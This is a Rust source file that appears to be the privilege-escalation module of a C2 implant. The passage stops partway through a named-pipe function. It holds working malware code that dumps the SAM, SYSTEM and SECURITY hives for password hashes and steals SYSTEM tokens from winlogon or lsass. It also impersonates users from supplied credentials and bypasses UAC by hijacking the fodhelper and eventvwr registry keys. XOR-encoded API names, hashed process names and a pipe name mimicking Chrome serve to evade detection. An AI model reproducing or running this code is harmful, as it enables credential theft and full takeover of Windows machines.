//! Privilege escalation — Phase 4.
//! Task type: "priv", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_priv(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_priv_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("priv: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_priv_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("priv: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("priv: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "sam-dump"       => sam_dump(),
        "token-steal"    => token_steal(&v),
        "token-make"     => token_make(&v),
        "uac-fodhelper"         => uac_fodhelper(&v),
        "uac-eventvwr"          => uac_eventvwr(&v),
        "uac-sdclt"             => uac_sdclt(&v),
        "pipe-impersonate"      => pipe_impersonate(),
        "unquoted-paths"        => enum_unquoted_paths(),
        "dll-hijack"            => enum_dll_hijack(),
        "always-install-elevated" => check_always_install_elevated(),
        "potato"                  => potato(&v),
        "shadow-creds"            => priv_shadow_creds(&v),
        "adcs"                    => priv_adcs(&v),
        "s4u"                     => priv_s4u(&v),
        "rbcd"                    => priv_rbcd(&v),
        "acl-abuse"               => priv_acl_abuse(&v),
        other => TaskOutput::failure(&format!("priv: unknown method: {other}")),
    }
}

// ── Advapi32 dynamic loader ───────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn adv_base() -> usize {
    // "advapi32.dll\0" XOR 0x5A
    crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    )
}

#[cfg(target_os = "windows")]
unsafe fn adv_fn(base: usize, enc: &[u8]) -> Option<*const u8> {
    let name = crate::obfs::dec(enc);
    crate::loader::get_export_by_name(base, name.as_ptr())
}

#[cfg(target_os = "windows")]
fn create_process_system32(exe_name: &str) -> Result<(), u32> {
    let k32 = k32_base();
    if k32 == 0 { return Err(0xDEAD0001); }

    // "CreateProcessW\0" XOR 0x5A
    let p_cp = unsafe { crate::loader::get_export_by_name(k32,
        crate::obfs::dec(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D,0x5A]).as_ptr()) };
    // "CloseHandle\0" XOR 0x5A
    let p_cl = unsafe { crate::loader::get_export_by_name(k32,
        crate::obfs::dec(&[0x19,0x36,0x35,0x29,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A]).as_ptr()) };
    // "GetLastError\0" XOR 0x5A
    let p_gle = unsafe { crate::loader::get_export_by_name(k32,
        crate::obfs::dec(&[0x1D,0x3F,0x2E,0x16,0x3B,0x29,0x2E,0x1F,0x28,0x28,0x35,0x28,0x5A]).as_ptr()) };

    type CreateProcessWFn = unsafe extern "system" fn(*const u16, *mut u16, *const u8, *const u8, i32, u32, *const u8, *const u16, *const u8, *mut u8) -> i32;
    type CloseHandleFn    = unsafe extern "system" fn(isize) -> i32;
    type GetLastErrorFn   = unsafe extern "system" fn() -> u32;

    let fn_cp: CreateProcessWFn = match p_cp { Some(p) => unsafe { core::mem::transmute(p) }, None => return Err(0xDEAD0002) };
    let fn_cl: Option<CloseHandleFn> = p_cl.map(|p| unsafe { core::mem::transmute(p) });
    let fn_gle: Option<GetLastErrorFn> = p_gle.map(|p| unsafe { core::mem::transmute(p) });

    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
    let path: Vec<u16> = format!("{windir}\\System32\\{exe_name}").encode_utf16().chain(core::iter::once(0)).collect();

    // STARTUPINFOW: 104 bytes; set cb = 104 at offset 0, rest zeroed
    let mut si = [0u8; 104];
    si[0..4].copy_from_slice(&104u32.to_le_bytes());
    let mut pi = [0u8; 24];

    let ret = unsafe { fn_cp(path.as_ptr(), core::ptr::null_mut(), core::ptr::null(), core::ptr::null(), 0, 0, core::ptr::null(), core::ptr::null(), si.as_ptr(), pi.as_mut_ptr()) };

    if ret != 0 {
        if let Some(close) = fn_cl {
            let hp = isize::from_le_bytes(pi[0..8].try_into().unwrap_or([0;8]));
            let ht = isize::from_le_bytes(pi[8..16].try_into().unwrap_or([0;8]));
            if hp != 0 && hp != -1 { unsafe { close(hp); } }
            if ht != 0 && ht != -1 { unsafe { close(ht); } }
        }
        Ok(())
    } else {
        let err = fn_gle.map(|f| unsafe { f() }).unwrap_or(0xFFFFFFFF);
        Err(err)
    }
}

// Launch a System32 binary via ShellExecuteExW (routes through elevation service
// for auto-elevate binaries — CreateProcessW returns ERROR_ELEVATION_REQUIRED for those).
// "shell32.dll\0" XOR 0x5A = [0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]
// "ShellExecuteExW\0" XOR 0x5A = [0x09,0x32,0x3F,0x36,0x36,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F,0x1F,0x22,0x0D,0x5A]
#[cfg(target_os = "windows")]
fn shell_execute_ex_system32(exe_name: &str) -> Result<(), u32> {
    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
    let path: Vec<u16> = format!("{windir}\\System32\\{exe_name}").encode_utf16().chain(core::iter::once(0)).collect();

    let shell32_name = crate::obfs::dec(&[0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
    let shell32 = {
        use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
        let b = crate::loader::get_module_base(shell32_name.as_ptr());
        if b != 0 { b } else { unsafe { LoadLibraryA(shell32_name.as_ptr()) as usize } }
    };
    if shell32 == 0 { return Err(0xDEAD0010); }

    let p_sex = unsafe { crate::loader::get_export_by_name(shell32,
        crate::obfs::dec(&[0x09,0x32,0x3F,0x36,0x36,0x1F,0x22,0x3F,0x39,0x2F,0x2E,0x3F,0x1F,0x22,0x0D,0x5A]).as_ptr()) };
    let fn_sex = match p_sex {
        Some(p) => unsafe { core::mem::transmute::<*const u8, unsafe extern "system" fn(*mut u8) -> i32>(p) },
        None    => return Err(0xDEAD0011),
    };

    // SHELLEXECUTEINFOW layout (64-bit, 112 bytes total):
    // +0  cbSize   DWORD  4
    // +4  fMask    ULONG  4
    // +8  hwnd     HWND   8
    // +16 lpVerb   *u16   8  (NULL = default verb)
    // +24 lpFile   *u16   8
    // +32 lpParam  *u16   8  (NULL)
    // +40 lpDir    *u16   8  (NULL)
    // +48 nShow    INT    4
    // +52 pad      4
    // +56 hInstApp HINST  8
    // rest 0
    let mut sei = [0u8; 112];
    sei[0..4].copy_from_slice(&112u32.to_le_bytes());
    // SEE_MASK_FLAG_NO_UI = 0x0400 (suppress error dialogs)
    sei[4..8].copy_from_slice(&0x0400u32.to_le_bytes());
    let p_file = path.as_ptr() as u64;
    sei[24..32].copy_from_slice(&p_file.to_le_bytes());
    // nShow = SW_SHOW = 5
    sei[48..52].copy_from_slice(&5i32.to_le_bytes());

    let ret = unsafe { fn_sex(sei.as_mut_ptr()) };
    if ret != 0 {
        Ok(())
    } else {
        let k32 = k32_base();
        let p_gle = unsafe { crate::loader::get_export_by_name(k32,
            crate::obfs::dec(&[0x1D,0x3F,0x2E,0x16,0x3B,0x29,0x2E,0x1F,0x28,0x28,0x35,0x28,0x5A]).as_ptr()) };
        type GetLastErrorFn = unsafe extern "system" fn() -> u32;
        let err = p_gle.map(|p| unsafe { (core::mem::transmute::<_, GetLastErrorFn>(p))() }).unwrap_or(0xFFFF);
        Err(err)
    }
}

#[cfg(target_os = "windows")]
fn k32_base() -> usize {
    // "kernel32.dll\0" XOR 0x5A
    crate::loader::get_module_base(
        crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    )
}

// ── SAM/SYSTEM/SECURITY hive dump ─────────────────────────────────────────────
//
// 1. Enable SeBackupPrivilege (idx 17) via RtlAdjustPrivilege
// 2. RegOpenKeyExA HKLM\SAM, \SYSTEM, \SECURITY with REG_OPTION_BACKUP_RESTORE
// 3. RegSaveKeyExA to temp files
// 4. Read + base64-encode each hive → return JSON
// 5. Delete temp files

#[cfg(target_os = "windows")]
fn sam_dump() -> TaskOutput {
    use windows_sys::Win32::Foundation::CloseHandle;

    enable_backup_privilege();

    const HKLM: isize = -2147483646isize;
    const KEY_READ: u32 = 0x20019;
    const REG_OPTION_BACKUP_RESTORE: u32 = 0x0004;

    let adv = adv_base();
    if adv == 0 { return TaskOutput::failure("sam: advapi32 not found"); }

    type RegOpenKeyExAFn = unsafe extern "system" fn(isize, *const u8, u32, u32, *mut isize) -> i32;
    type RegSaveKeyExAFn = unsafe extern "system" fn(isize, *const u8, *const u8, u32) -> i32;
    type RegCloseKeyFn   = unsafe extern "system" fn(isize) -> i32;

    let fn_open  = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x15,0x2A,0x3F,0x34,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let fn_save  = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x09,0x3B,0x2C,0x3F,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let fn_close = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0x5A]) };

    let (fn_open, fn_save, fn_close) = match (fn_open, fn_save, fn_close) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, RegOpenKeyExAFn>(a) },
            unsafe { core::mem::transmute::<_, RegSaveKeyExAFn>(b) },
            unsafe { core::mem::transmute::<_, RegCloseKeyFn>(c) },
        ),
        _ => return TaskOutput::failure("sam: failed to resolve reg functions"),
    };

    let hives = [
        (b"SAM\0".as_ptr(),      b"C:\\Windows\\Temp\\~s1.tmp\0".as_ptr()),
        (b"SYSTEM\0".as_ptr(),   b"C:\\Windows\\Temp\\~s2.tmp\0".as_ptr()),
        (b"SECURITY\0".as_ptr(), b"C:\\Windows\\Temp\\~s3.tmp\0".as_ptr()),
    ];

    let mut results: Vec<(&str, Vec<u8>)> = Vec::new();
    for (sub, tmp_path) in &hives {
        let mut hkey: isize = 0;
        let r = unsafe { fn_open(HKLM, *sub, REG_OPTION_BACKUP_RESTORE, KEY_READ, &mut hkey) };
        if r != 0 || hkey == 0 { continue; }
        unsafe { fn_save(hkey, *tmp_path, core::ptr::null(), 1 /* REG_LATEST_FORMAT */) };
        unsafe { fn_close(hkey) };
        let path_str = unsafe {
            let mut len = 0;
            while *tmp_path.add(len) != b'\0' { len += 1; }
            core::str::from_utf8_unchecked(core::slice::from_raw_parts(*tmp_path, len))
        };
        if let Ok(data) = std::fs::read(path_str) {
            let _ = std::fs::remove_file(path_str);
            let name = unsafe {
                let mut len = 0;
                while *sub.add(len) != b'\0' { len += 1; }
                core::str::from_utf8_unchecked(core::slice::from_raw_parts(*sub, len))
            };
            results.push((name, data));
        }
    }

    if results.is_empty() {
        return TaskOutput::failure("sam: no hives saved (need SeBackupPrivilege / admin)");
    }

    use base64::Engine;
    let mut out = String::from("{");
    for (i, (name, data)) in results.iter().enumerate() {
        if i > 0 { out.push(','); }
        let b64 = base64::engine::general_purpose::STANDARD.encode(data);
        out.push_str(&format!("\"{}\":\"{}\"", name, b64));
    }
    out.push('}');
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn enable_backup_privilege() {
    let ntdll = crate::loader::get_module_base(
        crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if ntdll == 0 { return; }
    // "RtlAdjustPrivilege\0" XOR 0x5A
    let fn_ptr = unsafe { crate::loader::get_export_by_name(ntdll,
        crate::obfs::dec(&[0x43,0x65,0x7D,0x50,0x75,0x7B,0x64,0x62,0x65,0x41,0x63,0x78,0x67,0x78,0x7D,0x74,0x76,0x74,0x11]).as_ptr()
    )};
    if let Some(p) = fn_ptr {
        type Fn = unsafe extern "system" fn(u32, u32, u32, *mut u32) -> i32;
        let f: Fn = unsafe { core::mem::transmute(p) };
        let mut prev: u32 = 0;
        unsafe { f(17, 1, 0, &mut prev) }; // SeBackupPrivilege = 17
    }
}

// ── Token steal ───────────────────────────────────────────────────────────────
//
// Finds winlogon.exe (SYSTEM), opens its token, duplicates to a primary token,
// then either impersonates in-place or spawns a child process as SYSTEM.
// args: {"method":"token-steal", "spawn":"<optional cmd>"}

#[cfg(target_os = "windows")]
fn token_steal(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION};

    let spawn_cmd = v.get("spawn").and_then(|s| s.as_str()).map(String::from);

    // Find a SYSTEM process — prefer winlogon.exe, fall back to lsass/services
    // DJB2 hashes so no plaintext
    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
    const TARGETS: &[u32] = &[
        djb2(b"winlogon.exe"),
        djb2(b"lsass.exe"),
        djb2(b"services.exe"),
    ];

    let pid = find_pid_by_hash(TARGETS)
        .ok_or("token-steal: no suitable SYSTEM process found")
        .map_err(|e| TaskOutput::failure(e));
    let pid = match pid { Ok(p) => p, Err(e) => return e };

    let proc = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid) };
    if proc == 0 { return TaskOutput::failure("token-steal: OpenProcess failed"); }

    let adv = adv_base();
    if adv == 0 { unsafe { CloseHandle(proc) }; return TaskOutput::failure("token-steal: advapi32 not found"); }

    type OpenProcessTokenFn      = unsafe extern "system" fn(isize, u32, *mut isize) -> i32;
    type DuplicateTokenExFn      = unsafe extern "system" fn(isize, u32, *mut u8, u32, u32, *mut isize) -> i32;
    type ImpersonateFn           = unsafe extern "system" fn(isize) -> i32;
    type CreateProcWithTokenWFn  = unsafe extern "system" fn(isize, u32, *const u16, *mut u16, u32, *mut u8, *const u16, *mut u8, *mut u8) -> i32;
    type GetUserNameWFn          = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;

    let p_open    = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0E,0x35,0x31,0x3F,0x34,0x5A]) };
    let p_dup     = unsafe { adv_fn(adv, &[0x1E,0x2F,0x2A,0x36,0x33,0x39,0x3B,0x2E,0x3F,0x0E,0x35,0x31,0x3F,0x34,0x1F,0x22,0x5A]) };
    let p_imp     = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x16,0x35,0x3D,0x3D,0x3F,0x3E,0x15,0x34,0x0F,0x29,0x3F,0x28,0x5A]) };
    let p_cpwt    = unsafe { adv_fn(adv, &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D,0x33,0x2E,0x32,0x0E,0x35,0x31,0x3F,0x34,0x0D,0x5A]) };
    let p_getuser = unsafe { adv_fn(adv, &[0x1D,0x3F,0x2E,0x0F,0x29,0x3F,0x28,0x14,0x3B,0x37,0x3F,0x0D,0x5A]) };

    let (fn_open, fn_dup, fn_imp, fn_getuser) = match (p_open, p_dup, p_imp, p_getuser) {
        (Some(a), Some(b), Some(c), Some(e)) => (
            unsafe { core::mem::transmute::<_, OpenProcessTokenFn>(a) },
            unsafe { core::mem::transmute::<_, DuplicateTokenExFn>(b) },
            unsafe { core::mem::transmute::<_, ImpersonateFn>(c) },
            unsafe { core::mem::transmute::<_, GetUserNameWFn>(e) },
        ),
        _ => { unsafe { CloseHandle(proc) }; return TaskOutput::failure("token-steal: fn resolve failed"); }
    };

    const TOKEN_DUPLICATE:     u32 = 0x0002;
    const TOKEN_QUERY:         u32 = 0x0008;
    const TOKEN_ALL_ACCESS:    u32 = 0xF01FF;
    const SECURITY_IMPERSONATION: u32 = 2;
    const TOKEN_PRIMARY:       u32 = 1;

    let mut token: isize = 0;
    if unsafe { fn_open(proc as isize, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token) } == 0 {
        unsafe { CloseHandle(proc) };
        return TaskOutput::failure("token-steal: OpenProcessToken failed");
    }
    unsafe { CloseHandle(proc) };

    let mut dup_token: isize = 0;
    if unsafe { fn_dup(token, TOKEN_ALL_ACCESS, core::ptr::null_mut(), SECURITY_IMPERSONATION, TOKEN_PRIMARY, &mut dup_token) } == 0 {
        unsafe { CloseHandle(token) };
        return TaskOutput::failure("token-steal: DuplicateTokenEx failed");
    }
    unsafe { CloseHandle(token) };

    if let Some(cmd) = spawn_cmd {
        // Spawn process as the stolen identity
        if let Some(cpwt_ptr) = p_cpwt {
            let fn_cpwt: CreateProcWithTokenWFn = unsafe { core::mem::transmute(cpwt_ptr) };
            let mut cmdline: Vec<u16> = cmd.encode_utf16().chain(core::iter::once(0)).collect();
            use windows_sys::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW};
            let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            let ok = unsafe { fn_cpwt(
                dup_token, 0,
                core::ptr::null(), cmdline.as_mut_ptr(),
                CREATE_NO_WINDOW,
                core::ptr::null_mut(), core::ptr::null(),
                &mut si as *mut _ as *mut u8,
                &mut pi as *mut _ as *mut u8,
            ) };
            unsafe { CloseHandle(dup_token) };
            if ok == 0 {
                return TaskOutput::failure("token-steal: CreateProcessWithTokenW failed");
            }
            unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread) };
            return TaskOutput::success(format!("spawned as SYSTEM (pid {})", pi.dwProcessId).into_bytes());
        }
    }

    // Impersonate in the current thread
    unsafe { fn_imp(dup_token) };
    unsafe { CloseHandle(dup_token) };

    let mut name = [0u16; 256];
    let mut len = 256u32;
    let ok = unsafe { fn_getuser(name.as_mut_ptr(), &mut len) };
    if ok != 0 && len > 1 {
        let who = String::from_utf16_lossy(&name[..len as usize - 1]);
        TaskOutput::success(format!("impersonating: {who}").into_bytes())
    } else {
        TaskOutput::success(b"token stolen; impersonating (GetUserNameW failed)".to_vec())
    }
}

#[cfg(target_os = "windows")]
fn find_pid_by_hash(hashes: &[u32]) -> Option<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return None; }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name: Vec<u8> = String::from_utf16_lossy(&e.szExeFile[..nlen])
                    .to_ascii_lowercase().into_bytes();
                let h = crate::obfs::djb2(&name);
                if hashes.contains(&h) {
                    let pid = e.th32ProcessID;
                    CloseHandle(snap);
                    return Some(pid);
                }
                e = core::mem::zeroed();
                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        CloseHandle(snap);
        None
    }
}

// ── Token make (LogonUser) ────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn token_make(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::Foundation::CloseHandle;

    let user   = match v.get("user").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("token-make: missing user") };
    let pass   = match v.get("pass").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("token-make: missing pass") };
    let domain = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");

    let adv = adv_base();
    if adv == 0 { return TaskOutput::failure("token-make: advapi32 not found"); }

    type LogonUserWFn   = unsafe extern "system" fn(*const u16, *const u16, *const u16, u32, u32, *mut isize) -> i32;
    type ImpersonateFn  = unsafe extern "system" fn(isize) -> i32;

    let p_logon = unsafe { adv_fn(adv, &[0x16,0x35,0x3D,0x35,0x34,0x0F,0x29,0x3F,0x28,0x0D,0x5A]) };
    let p_imp   = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x16,0x35,0x3D,0x3D,0x3F,0x3E,0x15,0x34,0x0F,0x29,0x3F,0x28,0x5A]) };

    let (fn_logon, fn_imp) = match (p_logon, p_imp) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, LogonUserWFn>(a) },
            unsafe { core::mem::transmute::<_, ImpersonateFn>(b) },
        ),
        _ => return TaskOutput::failure("token-make: fn resolve failed"),
    };

    let user_w:   Vec<u16> = user.encode_utf16().chain(core::iter::once(0)).collect();
    let pass_w:   Vec<u16> = pass.encode_utf16().chain(core::iter::once(0)).collect();
    let domain_w: Vec<u16> = domain.encode_utf16().chain(core::iter::once(0)).collect();

    const LOGON32_LOGON_NETWORK: u32  = 3;
    const LOGON32_PROVIDER_DEFAULT: u32 = 0;

    let mut token: isize = 0;
    let ok = unsafe { fn_logon(user_w.as_ptr(), domain_w.as_ptr(), pass_w.as_ptr(),
        LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &mut token) };
    if ok == 0 || token == 0 {
        return TaskOutput::failure(&format!("token-make: LogonUserW failed for {domain}\\{user}"));
    }

    unsafe { fn_imp(token) };
    unsafe { CloseHandle(token) };
    TaskOutput::success(format!("token created and impersonating: {domain}\\{user}").into_bytes())
}

// ── UAC bypass — fodhelper ────────────────────────────────────────────────────
//
// Writes cmd to HKCU\Software\Classes\ms-settings\Shell\Open\command,
// sets DelegateExecute="", then launches fodhelper.exe which reads the
// HKCU class association and runs our command elevated.

#[cfg(target_os = "windows")]
fn uac_fodhelper(v: &serde_json::Value) -> TaskOutput {
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c.to_string(),
        None    => return TaskOutput::failure("uac-fodhelper: missing cmd"),
    };

    if let Err(e) = reg_write_uac_key(&cmd) {
        return TaskOutput::failure(&format!("uac-fodhelper: reg write failed: {e}"));
    }

    let result = shell_execute_ex_system32("fodhelper.exe");
    std::thread::sleep(std::time::Duration::from_millis(2500));
    reg_delete_uac_key();

    match result {
        Ok(()) => TaskOutput::success(b"uac-fodhelper: payload launched".to_vec()),
        Err(e)  => TaskOutput::failure(&format!("uac-fodhelper: ShellExecuteExW failed err={e:#010x}")),
    }
}

#[cfg(target_os = "windows")]
fn uac_eventvwr(v: &serde_json::Value) -> TaskOutput {
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c.to_string(),
        None    => return TaskOutput::failure("uac-eventvwr: missing cmd"),
    };

    // eventvwr reads HKCU\Software\Classes\mscfile\shell\open\command
    if let Err(e) = reg_write_mscfile_key(&cmd) {
        return TaskOutput::failure(&format!("uac-eventvwr: {e}"));
    }

    let result = shell_execute_ex_system32("eventvwr.exe");
    std::thread::sleep(std::time::Duration::from_millis(3000));
    reg_delete_mscfile_key();

    match result {
        Ok(()) => TaskOutput::success(b"uac-eventvwr: payload launched".to_vec()),
        Err(e)  => TaskOutput::failure(&format!("uac-eventvwr: ShellExecuteExW failed err={e:#010x}")),
    }
}

#[cfg(target_os = "windows")]
fn reg_write_uac_key(cmd: &str) -> Result<(), String> {
    reg_set_key_value(
        "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "",
        cmd,
    )?;
    reg_set_key_value(
        "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "DelegateExecute",
        "",
    )
}

#[cfg(target_os = "windows")]
fn reg_delete_uac_key() {
    reg_delete_key("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    reg_delete_key("Software\\Classes\\ms-settings\\Shell\\Open");
    reg_delete_key("Software\\Classes\\ms-settings\\Shell");
    reg_delete_key("Software\\Classes\\ms-settings");
}

#[cfg(target_os = "windows")]
fn reg_write_mscfile_key(cmd: &str) -> Result<(), String> {
    reg_set_key_value("Software\\Classes\\mscfile\\shell\\open\\command", "", cmd)
}

#[cfg(target_os = "windows")]
fn reg_delete_mscfile_key() {
    reg_delete_key("Software\\Classes\\mscfile\\shell\\open\\command");
    reg_delete_key("Software\\Classes\\mscfile\\shell\\open");
    reg_delete_key("Software\\Classes\\mscfile\\shell");
    reg_delete_key("Software\\Classes\\mscfile");
}

// ── Registry helpers (HKCU, dynamic advapi32 calls) ──────────────────────────

#[cfg(target_os = "windows")]
fn reg_set_key_value(subkey: &str, value_name: &str, data: &str) -> Result<(), String> {
    const HKCU: isize = -2147483647isize;
    const KEY_WRITE: u32 = 0x20006;
    const REG_SZ: u32 = 1;

    type RegCreateKeyExAFn = unsafe extern "system" fn(isize, *const u8, u32, *const u8, u32, u32, *const u8, *mut isize, *mut u32) -> i32;
    type RegSetValueExAFn  = unsafe extern "system" fn(isize, *const u8, u32, u32, *const u8, u32) -> i32;
    type RegCloseKeyFn     = unsafe extern "system" fn(isize) -> i32;

    let adv = adv_base();
    if adv == 0 { return Err("advapi32 not found".into()); }

    let p_create = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let p_set    = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x09,0x3F,0x2E,0x0C,0x3B,0x36,0x2F,0x3F,0x1F,0x22,0x1B,0x5A]) };
    let p_close  = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0x5A]) };

    let (fn_create, fn_set, fn_close) = match (p_create, p_set, p_close) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, RegCreateKeyExAFn>(a) },
            unsafe { core::mem::transmute::<_, RegSetValueExAFn>(b) },
            unsafe { core::mem::transmute::<_, RegCloseKeyFn>(c) },
        ),
        _ => return Err("fn resolve failed".into()),
    };

    let sub = std::ffi::CString::new(subkey).map_err(|e| e.to_string())?;
    let mut hkey: isize = 0;
    let mut disp: u32 = 0;
    let r = unsafe { fn_create(HKCU, sub.as_ptr() as *const u8, 0, core::ptr::null(), 0, KEY_WRITE, core::ptr::null(), &mut hkey, &mut disp) };
    if r != 0 { return Err(format!("RegCreateKeyEx failed: {r}")); }

    let vname = std::ffi::CString::new(value_name).map_err(|e| e.to_string())?;
    let data_c = std::ffi::CString::new(data).map_err(|e| e.to_string())?;
    let data_bytes = data_c.as_bytes_with_nul();
    unsafe { fn_set(hkey, vname.as_ptr() as *const u8, 0, REG_SZ, data_bytes.as_ptr(), data_bytes.len() as u32) };
    unsafe { fn_close(hkey) };
    Ok(())
}

#[cfg(target_os = "windows")]
fn reg_delete_key(subkey: &str) {
    const HKCU: isize = -2147483647isize;
    type RegDeleteKeyAFn = unsafe extern "system" fn(isize, *const u8) -> i32;
    let adv = adv_base();
    if adv == 0 { return; }
    let p = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x11,0x3F,0x23,0x1B,0x5A]) };
    if let Some(p) = p {
        let f: RegDeleteKeyAFn = unsafe { core::mem::transmute(p) };
        let s = match std::ffi::CString::new(subkey) { Ok(s) => s, Err(_) => return };
        unsafe { f(HKCU, s.as_ptr() as *const u8) };
    }
}

// ── Named pipe impersonation ──────────────────────────────────────────────────
//
// Creates an overlapped pipe and waits 15s for a privileged process to connect,
// then calls ImpersonateNamedPipeClient.
// GetOverlappedResult(bWait=TRUE) is called after CancelIoEx to drain the
// cancelled I/O before closing handles — without this the pipe handle close
// can race with the kernel completion and hang indefinitely.

#[cfg(target_os = "windows")]
fn pipe_impersonate() -> TaskOutput {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::IO::{CancelIoEx, GetOverlappedResult, OVERLAPPED};
    use windows_sys::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
        PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
    };
    use windows_sys::Win32::System::Threading::{CreateEventA, WaitForSingleObject};
    const PIPE_ACCESS_DUPLEX:   u32 = 3;
    const FILE_FLAG_OVERLAPPED: u32 = 0x4000_0000;
    const WAIT_OBJECT_0:        u32 = 0;
    const NMPWAIT_USE_DEFAULT:  u32 = 0;

    let pipe_name = format!("\\\\.\\pipe\\mojo.{}.google.chrome.{:08X}",
        std::process::id(), rand_u32());
    let cname = match std::ffi::CString::new(pipe_name.as_str()) {
        Ok(c) => c, Err(_) => return TaskOutput::failure("pipe: name error"),
    };

    let event = unsafe { CreateEventA(core::ptr::null(), 1, 0, core::ptr::null()) };
    if event == 0 { return TaskOutput::failure("pipe: CreateEvent failed"); }

    let pipe = unsafe {
        CreateNamedPipeA(
            cname.as_ptr() as *const u8,
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 4096, 4096, NMPWAIT_USE_DEFAULT, core::ptr::null(),
        )
    };
